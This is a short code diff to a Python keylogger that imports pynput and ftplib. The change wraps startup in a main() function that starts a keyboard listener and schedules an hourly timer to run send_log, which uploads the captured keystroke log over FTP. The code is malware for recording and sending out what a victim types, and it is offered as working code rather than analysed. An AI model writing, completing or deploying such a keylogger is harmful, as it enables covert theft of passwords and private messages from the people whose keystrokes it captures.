@@ -1,7 +1,6 @@
 # import libraries
 from pynput import keyboard
 from ftplib import FTP
-import datetime
 import threading
 
 
@@ -36,7 +35,12 @@ def send_log():
         return f"Error uploading log file: {e}"
 
 
-if __name__ == "__main__":
+# Main function that starts the logger
+def main():
     listener = keyboard.Listener(on_press=keypressed)
     listener.start()
-    input()
+    threading.Timer(upload_interval, send_log).start()  # Uploads the log every hour
+
+
+if __name__ == "__main__":
+    main()
